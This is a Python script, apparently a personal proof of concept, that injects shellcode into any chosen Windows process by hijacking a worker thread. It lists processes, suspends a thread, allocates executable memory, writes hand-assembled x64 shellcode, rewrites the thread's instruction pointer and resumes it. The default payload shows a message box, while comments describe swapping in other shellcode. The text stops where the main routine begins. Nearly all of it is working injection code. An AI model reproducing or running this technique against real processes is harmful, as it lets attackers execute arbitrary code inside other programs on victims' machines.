"""
(prod) Thread Hijacking, Classic
- hijack worker thread, to minimise impact on UI for GUI applications
- arch: x64 process/host
- target: (any process)
- payload: shellcode [default: spawn MessageBoxW()]


Admission:
----------
- I am by no means proficient with shellcode
- Google AI used extensively to generate required working payload -> create_payload_cowboy()
- as msfvenom generated payloads appeared to be stomping registers, even with EXITFUNC=thread set


Notes:
------
- finally a working solution -> payload executes effectively, does NOT crash parent process
- addresses three-body problem: alignment -> state preservation -> stack hygiene
- previous crashes were due to 0xc0000005 Access Violations, verifiable via Application Event Logs


CONTEXT64 struct vs manual packing/unpacking from 1232-byte buffer
------------------------------------------------------------------
CONTEXT64 struct created and kept here for posterity
- however even a simple infinite-loop payload would cause 0xc0000005 Access Violation issues (crash -> WerFault -> viewable in Application Event Logs)
- even on custom un-protected (!CFG) victim.exe binary that just spawns threads

Even though debug_cpu_registers() shows registers are at expected offsets
- still issues with ctypes potential truncation of 64-bit values and padding/alignment

To skip manualy calculating offsets and padding in order to align register values, a 1232-byte buffer created instead, and data packed/unpacked from known expected offset values for the Instruction and Stack pointers.


Steps
-----
1. Open target process
2. Find/open a thread in target process
3. Suspend the thread
4. Allocate memory for shellcode
5. Write shellcode to allocated memory
6. Get thread's current context (registers)
7. Modify RIP to point to your shellcode
8. Set thread's context (apply changes)
9. Resume the thread → shellcode executes
"""

import ctypes
from ctypes import wintypes
from collections import defaultdict
from contextlib import contextmanager
import msvcrt
import struct


kernel32 = ctypes.WinDLL('kernel32.dll', use_last_error=True)
user32   = ctypes.WinDLL('user32.dll',   use_last_error=True)   # for MessageBoxW()


# ----------------------------------
# CONSTANTS
# ----------------------------------

# CreateToolhelp32Snapshot()
INVALID_HANDLE_VALUE        = wintypes.HANDLE(-1)
TH32CS_SNAPPROCESS          = 0x02
TH32CS_SNAPTHREAD           = 0x04

# CONTEXT64() struct
CONTEXT_ALL     = 0x10001f 
CONTEXT_CONTROL = 0x100001 

# OpenProcess()
PROCESS_ALL_ACCESS = 0x1F0FFF               # likely to fail unless run elevated/as-admin
PROCESS_QUERY_LIMITED_INFORMATION = 0x1000  # alternative, minimal privileges required

# OpenThread()
THREAD_ALL_ACCESS           = 0x1FFFFF
THREAD_QUERY_INFORMATION    = 0x0040

# PROCESSENTRY32W() struct
MAX_PATH = 260

# VirtualAllocEx() / VirtualProtectEx () - samples
MEM_COMMIT              = 0x1000
MEM_RESERVE             = 0x2000
PAGE_NOACCESS           = 0x01
PAGE_READONLY           = 0x02
PAGE_READWRITE          = 0x04
PAGE_WRITECOPY          = 0x08
PAGE_EXECUTE            = 0x10
PAGE_EXECUTE_READ       = 0x20
PAGE_EXECUTE_READWRITE  = 0x40
PAGE_EXECUTE_WRITECOPY  = 0x80

# Return status used by various Nt_ and Suspend/Resume Thread()
NEG_RETURN_STATUS       = 0xFFFFFFFF

# Stack and memory alignment
STACK_SIZE      = 0x1000    # 4KB (one page)
SHADOW_SPACE    = 0x20      # 32 bytes, (standard x64 calling convention)
RET_ADDR_SIZE   = 0x08      # 8 bytes (size of a 64-bit address)
ALIGNMENT_MASK  = ~0xF      # mask for 16-byte alignment


# --------------- Mapping dictionary for common memory constants ---------------
MEM_STATE = {0x1000: "MEM_COMMIT", 0x2000: "MEM_RESERVE", 0x10000: "MEM_FREE"}
MEM_TYPE = {0x20000: "MEM_PRIVATE", 0x40000: "MEM_MAPPED", 0x1000000: "MEM_IMAGE"}
PAGE_PROTECT = {
    0x01: "PAGE_NOACCESS",
    0x02: "PAGE_READONLY",
    0x04: "PAGE_READWRITE",
    0x10: "PAGE_EXECUTE",
    0x20: "PAGE_EXECUTE_READ",
    0x40: "PAGE_EXECUTE_READWRITE"
}




# ----------------------------------
# Struct Definitions
# ----------------------------------

class PROCESSENTRY32W(ctypes.Structure):
    _fields_ = [
        ("dwSize",              wintypes.DWORD),
        ("cntUsage",            wintypes.DWORD),
        ("th32ProcessID",       wintypes.DWORD),
        ("th32DefaultHeapID",   ctypes.c_size_t),
        ("th32ModuleID",        wintypes.DWORD),
        ("cntThreads",          wintypes.DWORD),
        ("th32ParentProcessID", wintypes.DWORD),
        ("pcPriClassBase",      wintypes.LONG),
        ("dwFlags",             wintypes.DWORD),
        ("szExeFile",           wintypes.WCHAR * MAX_PATH)
]

class THREADENTRY32(ctypes.Structure):
    _fields_ = [
        ("dwSize",              wintypes.DWORD),
        ("cntUsage",            wintypes.DWORD),
        ("th32ThreadID",        wintypes.DWORD),
        ("th32OwnerProcessID",  wintypes.DWORD),
        ("tpBasePri",           wintypes.LONG),
        ("tpDeltaPri",          wintypes.LONG),
        ("dwFlags",             wintypes.DWORD),
    ]

class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.c_void_p),
        ("AllocationBase", ctypes.c_void_p),
        ("AllocationProtect", wintypes.DWORD),
        ("PartitionId", wintypes.WORD),
        ("RegionSize", ctypes.c_size_t),        # <--- This is the size
        ("State", wintypes.DWORD),              # 0x1000 = MEM_COMMIT
        ("Protect", wintypes.DWORD),            # 0x40 = PAGE_EXECUTE_READWRITE
        ("Type", wintypes.DWORD),               # 0x20000 = MEM_PRIVATE
    ]

# for CONTEXT64 struct
class M128A(ctypes.Structure):
    _pack_ = 16
    _fields_ = [
        ("Low", ctypes.c_uint64),
        ("High", ctypes.c_int64),
    ]

# Used to store CPU register data, for a given thread
# - struct required to be specific size, and registers at specific offsets
# - padding required to ensure fields exist on 16-byte boundaries
#
# Function to confirm above, created for this reason -> debug_cpu_registers()
# 
# Note: not actually used in this script, but kept for posterity
# - in case one day decide to brute-force this issue

class CONTEXT64(ctypes.Structure):
    """Complete Windows x64 CONTEXT structure - 1232 bytes total"""
    _pack_ = 16
    _fields_ = [
        # Register parameter home addresses (48 bytes)
        ("P1Home", ctypes.c_uint64),
        ("P2Home", ctypes.c_uint64),
        ("P3Home", ctypes.c_uint64),
        ("P4Home", ctypes.c_uint64),
        ("P5Home", ctypes.c_uint64),
        ("P6Home", ctypes.c_uint64),
        
        # Control flags (8 bytes)
        ("ContextFlags", wintypes.DWORD),
        ("MxCsr", wintypes.DWORD),
        
        # Segment registers (16 bytes)
        ("SegCs", wintypes.WORD),
        ("SegDs", wintypes.WORD),
        ("SegEs", wintypes.WORD),
        ("SegFs", wintypes.WORD),
        ("SegGs", wintypes.WORD),
        ("SegSs", wintypes.WORD),
        ("EFlags", wintypes.DWORD),
        
        # Debug registers (48 bytes)
        ("Dr0", ctypes.c_uint64),
        ("Dr1", ctypes.c_uint64),
        ("Dr2", ctypes.c_uint64),
        ("Dr3", ctypes.c_uint64),
        ("Dr6", ctypes.c_uint64),
        ("Dr7", ctypes.c_uint64),
        
        # Integer registers (128 bytes - 16 registers * 8 bytes)
        ("Rax", ctypes.c_uint64),
        ("Rcx", ctypes.c_uint64),
        ("Rdx", ctypes.c_uint64),
        ("Rbx", ctypes.c_uint64),
        ("Rsp", ctypes.c_uint64),
        ("Rbp", ctypes.c_uint64),
        ("Rsi", ctypes.c_uint64),
        ("Rdi", ctypes.c_uint64),
        ("R8", ctypes.c_uint64),
        ("R9", ctypes.c_uint64),
        ("R10", ctypes.c_uint64),
        ("R11", ctypes.c_uint64),
        ("R12", ctypes.c_uint64),
        ("R13", ctypes.c_uint64),
        ("R14", ctypes.c_uint64),
        ("R15", ctypes.c_uint64),
        
        # Instruction pointer (8 bytes)
        ("Rip", ctypes.c_uint64),
        
        # Floating point save area (512 bytes)
        ("FltSave", M128A * 32),
        
        # Vector registers (416 bytes - 26 * 16 bytes)
        ("VectorRegister", M128A * 26),
        ("VectorControl", ctypes.c_uint64),
        
        # Debug control (40 bytes)
        ("DebugControl", ctypes.c_uint64),
        ("LastBranchToRip", ctypes.c_uint64),
        ("LastBranchFromRip", ctypes.c_uint64),
        ("LastExceptionToRip", ctypes.c_uint64),
        ("LastExceptionFromRip", ctypes.c_uint64),
    ]




# ----------------------------------
# Function Prototypes
# ----------------------------------

# --------------- kernel32.dll ---------------
kernel32.CloseHandle.argtypes = [ wintypes.HANDLE, ]  # hObject
kernel32.CloseHandle.restype = wintypes.BOOL

kernel32.CreateToolhelp32Snapshot.argtypes=[
    wintypes.DWORD,             # dwFlags
    wintypes.DWORD,             # th32ProcessID
]
kernel32.CreateToolhelp32Snapshot.restype = wintypes.HANDLE

kernel32.GetModuleHandleW.argtypes = [
    wintypes.LPCWSTR,           # lpModuleName
]
kernel32.GetModuleHandleW.restype = wintypes.HANDLE

kernel32.GetProcAddress.argtypes = [
    wintypes.HMODULE,           # hModule
    wintypes.LPCSTR,            # lpProcName
]
kernel32.GetProcAddress.restype = ctypes.c_void_p

kernel32.GetThreadContext.argtypes = [
    wintypes.HANDLE,            # hThread
    ctypes.c_void_p,            # *lpContext
]
kernel32.GetThreadContext.restype = wintypes.BOOL

kernel32.GetThreadId.argtypes = [ wintypes.HANDLE, ]
kernel32.GetThreadId.restype = wintypes.DWORD

kernel32.GetThreadTimes.argtypes = [
    wintypes.HANDLE,                    # hThread
    ctypes.POINTER(wintypes.FILETIME),  # lpCreationtime
    ctypes.POINTER(wintypes.FILETIME),  # lpExitTime
    ctypes.POINTER(wintypes.FILETIME),  # lpKernelTime
    ctypes.POINTER(wintypes.FILETIME),  # lpUserTime
]    
kernel32.GetThreadTimes.restype = wintypes.BOOL

kernel32.LoadLibraryW.argtypes = [
    wintypes.LPCWSTR,   # lpLibFileName
]
kernel32.LoadLibraryW.restype = wintypes.HANDLE

kernel32.OpenProcess.argtypes = [
    wintypes.DWORD,    # dwDesiredAccess
    wintypes.BOOL,     # bInheritHandle
    wintypes.DWORD,    # dwProcessId
]
kernel32.OpenProcess.restype = wintypes.HANDLE

kernel32.OpenThread.argtypes = [
    wintypes.DWORD,    # dwDesiredAccess
    wintypes.BOOL,     # bInheritHandle
    wintypes.DWORD,    # dwThreadId
]
kernel32.OpenThread.restype = wintypes.HANDLE

kernel32.Process32FirstW.argtypes = [
    wintypes.HANDLE,                    # hSnapshot
    ctypes.POINTER(PROCESSENTRY32W),    # [o] lppe, proc-list entry from snapshot
]
kernel32.Process32FirstW.restype = wintypes.BOOL

kernel32.Process32NextW.argtypes=[
    wintypes.HANDLE,                    # hSnapshot
    ctypes.POINTER(PROCESSENTRY32W),    # [o] lppe, proc-list entry from snapshot
]
kernel32.Process32NextW.restype = wintypes.BOOL

kernel32.ReadProcessMemory.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPCVOID,                   # lpBaseAddress
    wintypes.LPVOID,                    # [o] lpBuffer
    ctypes.c_size_t,                    # nSize
    ctypes.POINTER(ctypes.c_size_t),    # [o] *lpNumberOfBytesRead
]
kernel32.ReadProcessMemory.restype = wintypes.BOOL

kernel32.ResumeThread.argtypes = [wintypes.HANDLE,]    # hThread
kernel32.ResumeThread.restype = wintypes.DWORD


kernel32.SetThreadContext.argtypes = [
    wintypes.HANDLE,            # hThread
    ctypes.c_void_p,            # *lpContext
]
kernel32.SetThreadContext.restype = wintypes.BOOL


kernel32.SuspendThread.argtypes = [wintypes.HANDLE,]    # hThread
kernel32.SuspendThread.restype = wintypes.DWORD

kernel32.Thread32First.argtypes = [
    wintypes.HANDLE,                    # hSnapshot
    ctypes.POINTER(THREADENTRY32),      # lpte
]
kernel32.Thread32First.restype = wintypes.BOOL

kernel32.Thread32Next.argtypes = [
    wintypes.HANDLE,                    # hSnapshot
    ctypes.POINTER(THREADENTRY32),      # lpte
]
kernel32.Thread32Next.restype = wintypes.BOOL

kernel32.VirtualAllocEx.argtypes = [
    wintypes.HANDLE,        # hProcess
    wintypes.LPVOID,        # lpAddress (opt) (can be null)
    ctypes.c_size_t,        # dwSize
    wintypes.DWORD,         # flAllocationType
    wintypes.DWORD,         # flProtect
]
kernel32.VirtualAllocEx.restype = ctypes.c_void_p

kernel32.VirtualQueryEx.argtypes = [
    wintypes.HANDLE,                            # hProcess
    wintypes.LPCVOID,                           # lpAddress (opt) 
    ctypes.POINTER(MEMORY_BASIC_INFORMATION),   # [o] lpBuffer
    ctypes.c_size_t,                            # dwLength
]
kernel32.VirtualQueryEx.restype = ctypes.c_size_t

kernel32.WriteProcessMemory.argtypes = [
    wintypes.HANDLE,                    # hProcess
    wintypes.LPVOID,                    # lpBaseAddress
    wintypes.LPCVOID,                   # lpBuffer
    ctypes.c_size_t,                    # nSize
    ctypes.POINTER(ctypes.c_size_t),    # [o] *lpNumberOfBytesWritten
]
kernel32.WriteProcessMemory.restype = wintypes.BOOL




# ----------------------------------
# Function Definitions
# ----------------------------------


# --------------- Misc helper functions ---------------
def winerr() -> OSError:
    """ Return a ctypes.WinError() with the last Windows API error """
    return ctypes.WinError(ctypes.get_last_error())


def close_handle(handle: wintypes.HANDLE, name: str="Handle") -> None:
    """ Close open handles, to prevent resource leaks """

    if name == "Snapshot":
        print(f"\n[+] Closing Handle to {name}: ", end='')
    else:
        print(f"    -> Closing Handle to {name}: ", end='')
    
    if handle is None or handle.value == 0:
        raise ValueError(f"[!] Warning: {name} is None or invalid, nothing to close")

    if not kernel32.CloseHandle(handle):
        print(f"[!] Failed! {name} handle: {handle}, Error: {winerr()}")
    else:
        print(f"Success ({handle.value})")


def key_sort(name: str) -> str:
    """ Ensure processes sorted alphabetically, regardless of case """
    return name.casefold()


def pause() -> None:
    """ Pause until user key press (any) """
    msg = "\nPress any key to continue..."
    print(msg, end='', flush=True)
    msvcrt.getch()
    print()


def print_hdr(hdr: str) -> None:
    border = "-" * len(hdr.strip())
    print(f"\n{border}{hdr}{border}")


def debug_cpu_registers() -> None:
    """
    CONTEXT64() struct used to hold a snapshot of a thread's processor state
    - here we debug to confirm proper struct size and register offsets
    - if numbers do NOT match expectations, then padding in STRUCT def are REQUIRED
    - this addresses 0xc000000005 Access Violation errors when calling ResumeThread()
    """
    
    print(f"\n[+] DEBUG: CONTEXT64() struct and CPU register offset info:")
    print(f"    -> Struct size: {ctypes.sizeof(CONTEXT64)} (Expected: 1232)")
    print(f"    -> Dr0 Offset: {CONTEXT64.Dr0.offset} (Expected: 80 or 96)")
    print(f"    -> Rax Offset: {CONTEXT64.Rax.offset} (Expected: 128 or 144)")
    print(f"    -> Rsp Offset: {CONTEXT64.Rsp.offset} (Expected: 152)")
    print(f"    -> Rip Offset: {CONTEXT64.Rip.offset} (Expected: 248)")


# --------------- Payload Prep ---------------


def get_message_box_addr() -> ctypes.c_void_p:
    """ Get memory address for MessageBoxW() """
    handle_user32 = kernel32.LoadLibraryW("user32.dll")
    
    print(f"\n[+] Obtaining address for MessageBoxW():")
    msgbox_addr = kernel32.GetProcAddress(handle_user32, b"MessageBoxW")

    if not msgbox_addr:
        raise winerr()
        
    print(f"    -> Success: {hex(msgbox_addr)}")
    
    return msgbox_addr




def create_payload_cowboy(hThread: wintypes.HANDLE, msgbox_addr: int) -> bytes:
    """
    Generate shellcode to spawn MessageBoxW()
    - aligns its own stack (16-byte) and uses a 'jmp' instead of 'ret' to return.
    """


    '''
    # Smaller code-block using CONTEXT64()
    ctx = CONTEXT64()
    ctx.ContextFlags = CONTEXT_ALL
    kernel32.GetThreadContext(hThread, ctypes.byref(ctx))
    original_rip = ctx.Rip
    '''

    # Get original_rip, using 1232-byte raw-buffer + 16 for manual alignment
    raw_buffer = ctypes.create_string_buffer(1232 + 16)
    aligned_addr = (ctypes.addressof(raw_buffer) + 0xF) & ALIGNMENT_MASK 
    aligned_buffer = (ctypes.c_char * 1232).from_address(aligned_addr)
    
    # set ContextFlags to CONTEXT_ALL, @ offset 48 <- return all registers
    struct.pack_into("<I", aligned_buffer, 48, CONTEXT_ALL) # 

    # ---------- GET: Current state ----------
    print(f"\n[+] Capturing current thread state: ", end='')
    if not kernel32.GetThreadContext(hThread, aligned_buffer):
        raise winerr()
    print("Success")

    # unpack Rip from  @ offset 248
    original_rip = struct.unpack_from("<Q", aligned_buffer, 248)[0]


    # setup MessageBoxW()
    title = "Hello There"
    caption = "Cowboy!"
    title_b = (title + '\0').encode('utf-16le')
    caption_b = (caption + '\0').encode('utf-16le')


    shellcode = bytearray()

    # 1. Save state and align
    shellcode += b'\x50'                          # push rax
    shellcode += b'\x51'                          # push rcx
    shellcode += b'\x52'                          # push rdx
    shellcode += b'\x41\x50'                      # push r8
    shellcode += b'\x41\x51'                      # push r9
    
    # 2. FORCE 16-byte alignment & Save RSP
    shellcode += b'\x48\x89\xe0'                  # mov rax, rsp
    shellcode += b'\x48\x83\xe4\xf0'              # and rsp, -16
    shellcode += b'\x48\x83\xec\x30'              # sub rsp, 0x30
    shellcode += b'\x48\x89\x44\x24\x28'          # mov [rsp+0x28], rax

    # 3. Setup Args
    shellcode += b'\x48\x31\xc9'                  # xor rcx, rcx (HWND=0)
    
    # RDX = lpText ("Cowboy!")
    rdx_patch = len(shellcode) + 3
    shellcode += b'\x48\x8d\x15\x00\x00\x00\x00'  
    
    # R8 = lpCaption ("Hello There,")
    r8_patch = len(shellcode) + 3
    shellcode += b'\x4c\x8d\x05\x00\x00\x00\x00'  
    
    # R9 = uType (MB_SERVICE_NOTIFICATION | MB_TOPMOST | MB_SETFOREGROUND)
    shellcode += b'\x41\xb9\x00\x00\x25\x00' 

    # 4. Call MessageBoxW
    shellcode += b'\x48\xb8' + struct.pack('<Q', msgbox_addr)
    shellcode += b'\xff\xd0'                      # call rax

    # 5. Restore stack and registers
    shellcode += b'\x48\x8b\x64\x24\x28'          # mov rsp, [rsp+0x28]
    shellcode += b'\x41\x59'                      # pop r9
    shellcode += b'\x41\x58'                      # pop r8
    shellcode += b'\x5a'                          # pop rdx
    shellcode += b'\x59'                          # pop rcx
    shellcode += b'\x58'                          # pop rax
    
    # 6. RETURN to original_rip 
    shellcode += b'\x48\xb8' + struct.pack('<Q', original_rip) # mov rax, [original_rip] 
    shellcode += b'\xff\xe0'                      # jmp rax

    # --- Patching String Offsets ---
    while len(shellcode) % 8 != 0: shellcode += b'\x90'
    
    # Patch RDX to point to text_b ("Cowboy!")
    shellcode[rdx_patch:rdx_patch+4] = struct.pack('<i', len(shellcode) - (rdx_patch + 4))
    shellcode += caption_b
    
    # Patch R8 to point to title_b ("Hello There,")
    shellcode[r8_patch:r8_patch+4] = struct.pack('<i', len(shellcode) - (r8_patch + 4))
    shellcode += title_b

    return bytes(shellcode)
    

# --------------- Process Id information ---------------


def group_pids_by_process() -> tuple[
            defaultdict[str, list[int]],
            dict[int, str]
]:
    """
    Snapshot taken of running processes -> TH32CS_SNAPPROCESS
    - iterated by Process32FirstW -> Process32NextW, until empty

    Returns a numer of dictionaries later used for different purposes
    [+] proc_groups: 
    - defaultdict() of process names, and list of associated PIDs
    - for iteration of full-print out 

    [+] pid_to_proc_map: O(1)
    - PID validation, 1:1 of PID to process name
    """

    # proc_groups -> for iterating whole list in full print-out
    proc_groups: defaultdict[str, list[int]] = defaultdict(list)

    # pid_proc_map -> fast search for later-on PID validation
    pid_to_proc_map: dict[int, str] = {}

    pe32w = PROCESSENTRY32W()
    pe32w.dwSize = ctypes.sizeof(PROCESSENTRY32W)

    # Context Manager - snapshot
    with snapshot(TH32CS_SNAPPROCESS) as hSnapshot: 
        if not kernel32.Process32FirstW(hSnapshot, ctypes.byref(pe32w)):
            raise winerr()

        print("    -> Taking Snapshot: Running Processes... ", end='', flush=True)

        while True:
            name = pe32w.szExeFile      # process name
            pid  = pe32w.th32ProcessID  # leave PIDs as ints in list

            proc_groups[name].append(pid)
            pid_to_proc_map[pid] = name
                
            if not kernel32.Process32NextW(hSnapshot, ctypes.byref(pe32w)):
                break

        print("Completed")

    return proc_groups, pid_to_proc_map




def print_pids_by_process(process_groups: dict[str, list[int]]) -> None:
    """
    Print Process Names -> associated PIDs -> count of PIDs
    - sorted alphabetically, then numerically
    - PID list truncated if too long (eg svchost.exe)
    """

    # header info
    print(f"\n{'Process Name':<40} {'PID':<40} {'Count':>5}")
    print('-' * 87)


    for process_name in sorted(process_groups.keys(), key=key_sort):
        sorted_pids = sorted(process_groups[process_name])
        
        # join pids -> must first be converted to type str()
        pid_list_str = ', '.join(str(pid) for pid in sorted_pids)
        
        count = len(sorted_pids)
        
        # truncate long list of PIDs
        if len(pid_list_str) > 35:
            pid_list_str = pid_list_str[:35] + '...'
        
        print(f"{process_name:<40} {pid_list_str:<40} {count:<5}")




def request_pid(pid_map: dict[int, str]) -> int:
    """ Return positive integer -> later validate if actual PID """
    while True:
        try:
            pid = int(input("\nPlease enter a valid PID: "))
            if pid > 0:
                if validate_pid(pid, pid_map):
                    return pid
            else:
                print("[!] Please enter a positive integer: ")
        except ValueError as e:
            print(f"\n[!] Invalid Input, Error: {e}")




def validate_pid(pid: int, pid_map: dict[int, str]) -> bool:
    """ Checks if PID exists in previous 'fast-search' dict map """
    
    process_name = pid_map.get(pid)

    if process_name:
        print(f"    -> PID found: {pid} Process: {process_name}")
        return True
    else:
        print(f"[!] Error: PID {pid} not found in snapshot")
        return False


# --------------- Thread Id information ---------------


def get_single_worker_thread(pid: int) -> tuple[wintypes.HANDLE, int]:
    """
    Return hThread and dwThreadId for a single, worker thread (not main)
    - requires iterating all Threads for a Pid
    - then sorting by creation timestamp, selecting any from non-oldest
    """
    
    thread_data = [] # list of tuples, (timestamp, tid)
    
    te32 = THREADENTRY32()
    te32.dwSize = ctypes.sizeof(THREADENTRY32)


    # iterate through system snapshot of active threads
    with snapshot(TH32CS_SNAPTHREAD) as hSnapshot:    
        if not kernel32.Thread32First(hSnapshot, ctypes.byref(te32)):
            raise winerr()
            
        print("    -> Taking Snapshot: Active Threads... ", end='', flush=True)
        
        while True:
            if te32.th32OwnerProcessID == pid:
                tid = te32.th32ThreadID

                # temporary handle
                hThread = kernel32.OpenThread(
                    THREAD_QUERY_INFORMATION,
                    False,
                    tid)

                # Windows stores time in the FILETIME() struct
                # - initialise four, to recieve creation, exit, kernel and user times
                if hThread:
                    ct = wintypes.FILETIME()
                    et = wintypes.FILETIME()
                    kt = wintypes.FILETIME()
                    ut = wintypes.FILETIME()
                    
                    # get creation times
                    if kernel32.GetThreadTimes(hThread,
                        ctypes.byref(ct),
                        ctypes.byref(et),
                        ctypes.byref(kt),
                        ctypes.byref(ut)
                    ):
                        # combine both 32-bit fields into one 64-bit timestamp
                        ts = (ct.dwHighDateTime << 32) + ct.dwLowDateTime
                        thread_data.append((ts, tid))

                kernel32.CloseHandle(hThread)

            if not kernel32.Thread32Next(hSnapshot, ctypes.byref(te32)):
                break
 
        print("Completed")
 
        print(f"\n[+] Finding Worker Thread Id: OpenThread()")
        if len(thread_data) < 2:
            print(f"\n[!] No worker threads found (process only has a single main thread [!]")
            return None


        # sort by timestamp (age), where index 0 is oldest (main thread)
        thread_data.sort()

        print(f"    -> Number of Threads: {len(thread_data)}")
        for ts,tid in thread_data:
            print(f"        + ThreadId: {tid}, Timestamp: {ts}")
        
        # select any non-main thread (here, we choose second oldest, main being the oldest)
        worker_tid = thread_data[1][1]
        
        hWorker = kernel32.OpenThread(THREAD_ALL_ACCESS, False, worker_tid)
        if not hWorker:
            print(f"[!] Failed to open Worker Thread Id: {worker_tid}")
            return None


        print(f"    -> Success, Worker Thread found: ({worker_tid})")
        return wintypes.HANDLE(hWorker), worker_tid



def suspend_thread(hThread: wintypes.HANDLE, dwThreadId: int) -> None:
    """ SuspendThread() returns 'current' count, then increments """
    
    print(f"\n[+] Suspending Worker Thread: ", end='')
    
    suspend_count = kernel32.SuspendThread(hThread)
    if suspend_count == NEG_RETURN_STATUS:
        raise winerr()
    
    print("Success")
    print(f"    -> ThreadId: {dwThreadId}")
    print(f"    -> Handle:   {hThread.value}")
    print(f"    -> Previous suspend count: {suspend_count}")
    print(f"    -> Current suspend count:  {suspend_count + 1}")
    


def resume_thread(hThread: wintypes.HANDLE, dwThreadId: int) -> None:
    """ ResumeThread() returns 'current' count, then decrements """
    
    print(f"\n[+] Resuming Worker Thread: ", end='')
    
    suspend_count = kernel32.ResumeThread(hThread)
    if suspend_count == NEG_RETURN_STATUS:
        raise winerr()
    
    print("Success")
    print(f"    -> ThreadId: {dwThreadId}")
    print(f"    -> Handle:   {hThread.value}")
    print(f"    -> Previous suspend count: {suspend_count}")
    print(f"    -> Current suspend count:  {suspend_count - 1}")


# --------------- Memory Manipulation ---------------


def allocate_memory(
    hProcess: wintypes.HANDLE,
    dwSize: ctypes.c_size_t
) -> wintypes.LPVOID:

    """
    Allocate memory in suspended process
    - returns: ptr to memory, in REMOTE process
    """

    print(f"\n[+] Allocating memory: ", end='')
    lpAddress = ctypes.c_void_p(0)
    ptr = kernel32.VirtualAllocEx(
            hProcess,
            lpAddress,
            dwSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE) # red flag but fine for PoC

    if not ptr:
        raise winerr()
    
    
    print("Success")
    print(f"    -> Base Address: {hex(ptr)}")
    return ptr




def allocate_memory_verification(hProcess: wintypes.HANDLE, lpAddress: int) -> None:
    """ Query MBI to verify memory has been allocated """
 
    mbi = MEMORY_BASIC_INFORMATION()
    
    
    print(f"\n[+] Verifying memory allocation: ", end='')
    if not kernel32.VirtualQueryEx(hProcess, lpAddress, ctypes.byref(mbi), ctypes.sizeof(mbi)):
        raise winerr()


    # ----- Fields/Formatting to make output look pretty -----
    match_addr = True if mbi.BaseAddress == lpAddress else False

    # use .get() to return hex, if constant isn't in the dictionary (CONSTANTS -> Mapped)
    state_str = MEM_STATE.get(mbi.State, hex(mbi.State))
    protect_str = PAGE_PROTECT.get(mbi.Protect, hex(mbi.Protect))
    type_str = MEM_TYPE.get(mbi.Type, hex(mbi.Type))

    V = 16

    print("Success")
    print(f"    -> Base Address:   {hex(mbi.BaseAddress):<{V}} (Match above: {match_addr})")
    print(f"    -> Region Size:    {hex(mbi.RegionSize):<{V}} ({mbi.RegionSize} Bytes)")
    print(f"    -> State:          {hex(mbi.State):<{V}} ({state_str})")
    print(f"    -> Protect:        {hex(mbi.Protect):<{V}} ({protect_str})")
    print(f"    -> Type:           {hex(mbi.Type):<{V}} ({type_str})")


# --------------- Write -------------------------


def write_payload(
    hProcess: wintypes.HANDLE,
    lpBaseAddress: int,
    payload: bytes
) -> None:

    """ Writes raw payload bytes directly into the target process memory """

    print(f"\n[+] Writing payload: ", end='')

    n_written = ctypes.c_size_t(0)

    if not kernel32.WriteProcessMemory(
        hProcess,
        lpBaseAddress,     # target/base address
        payload,           # raw byte string (e.g., b"\xfc\x48...")
        len(payload),      # size of payload
        ctypes.byref(n_written)
    ):
        raise winerr()

    print("Success")
    print(f"    -> Destination Address: {hex(lpBaseAddress)}")
    print(f"    -> Payload Size: {len(payload)} bytes")
    print(f"    -> Bytes written: {n_written.value}")



def write_payload_verification(
    hProcess: wintypes.HANDLE,
    lpBaseAddress: int,
    payload: bytes
    ):
    
    """ Verify that the memory written, matches the payload """
    
    read_buffer = ctypes.create_string_buffer(len(payload))
    num_bytes_read = ctypes.c_size_t(0)

    print(f"\n[+] Verifying written payload: ", end='')

    if not kernel32.ReadProcessMemory(
        hProcess,
        lpBaseAddress,
        read_buffer,
        len(payload),
        ctypes.byref(num_bytes_read)
    ):
        raise winerr()
        
    if payload != read_buffer.raw:
        raise ValueError(f"[!] Integrity checked failed: Content mismatch at {hex(lpBaseAddress)}")

    print("Success")
    print(f"    -> Integrity check confirmed")


# --------------- Get Thread Context -------------------------


def get_current_registers_context(
    hThread: wintypes.HANDLE,
    payload_addr: int
) -> None:
    """
    Simplified context hijacking for self-aligning shellcode.
    No longer needs to allocate a new stack or push RIP manually.
    """
    
    # Retrieve original Rip -> 
    # 1232-byte buffer for CONTEXT64 + 16 for manual alignment
    raw_buffer = ctypes.create_string_buffer(1232 + 16)
    aligned_addr = (ctypes.addressof(raw_buffer) + 0xF) & ALIGNMENT_MASK 
    aligned_buffer = (ctypes.c_char * 1232).from_address(aligned_addr)
    
    # set ContextFlags to CONTEXT_ALL - return all registers
    struct.pack_into("<I", aligned_buffer, 48, CONTEXT_ALL)

    # ---------- GET: Current state ----------
    print(f"\n[+] Capturing current thread state: ", end='')
    if not kernel32.GetThreadContext(hThread, aligned_buffer):
        raise winerr()
    print("Success")

    original_rip = struct.unpack_from("<Q", aligned_buffer, 248)[0]
    print(f"    -> Current RIP: {hex(original_rip)}")

    
    # ---------- MODIFY: Redirect RIP ----------
    print(f"\n[+] Redirecting RIP to payload: ", end='')
    # Overwrite RIP (Offset 248) with our injected shellcode address
    struct.pack_into("<Q", aligned_buffer, 248, payload_addr)
    print("Success")

    # ---------- SET: Apply the hijack ----------
    print(f"[+] Applying changes via SetThreadContext(): ", end='')
    if not kernel32.SetThreadContext(hThread, aligned_buffer):
        raise winerr()
    print("Success")




# ----------------------------------
# Context Managers
# ----------------------------------
#
# To be able to use 'with x as y:'
# - to automatically close handles upon exit

@contextmanager
def open_process(
        dwProcessId, 
        dwDesiredAccess=PROCESS_ALL_ACCESS, 
        bInheritHandle=False):
    print(f"\n[+] Opening Handle to Process: ", end='', flush=True)

    handle = wintypes.HANDLE(kernel32.OpenProcess(dwDesiredAccess, bInheritHandle, dwProcessId))

    if not handle:
        raise winerr()

    print(f"Success ({handle.value})")

    try:
        yield handle        # give caller, access to handle
    finally:
        close_handle(handle, "Process")
        handle.value = 0




@contextmanager
def snapshot(flags=TH32CS_SNAPPROCESS):
    print("\n[+] Creating handle to Snapshot: ", end='')
    hSnapshot = wintypes.HANDLE(kernel32.CreateToolhelp32Snapshot(flags, 0))

    if hSnapshot == INVALID_HANDLE_VALUE:
        raise winerr()

    print(f"Success ({hSnapshot.value})")

    try:
        yield hSnapshot     # give caller, access to handle
    finally:
        close_handle(hSnapshot, "Snapshot")
        hSnapshot.value = 0




##########################################
##### Main functionality starts here #####
##########################################

# confirm CONTEXT64 struct information
debug_cpu_registers()




# ----- Process Id information -----
